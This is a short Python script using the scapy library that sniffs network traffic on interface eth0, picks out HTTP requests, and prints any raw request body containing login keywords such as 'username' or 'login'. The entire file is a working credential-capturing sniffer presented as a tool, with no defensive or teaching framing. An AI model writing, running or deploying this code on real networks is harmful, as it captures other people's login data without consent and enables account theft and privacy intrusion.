#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http #need to issue this first: pip install scapy_http

def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords_username = ["username", "user", "UserName", "login", "Username"]
            for keyword in keywords_username:
                if keyword in str(load):
                    print(load)
                    break
    
sniffer("eth0")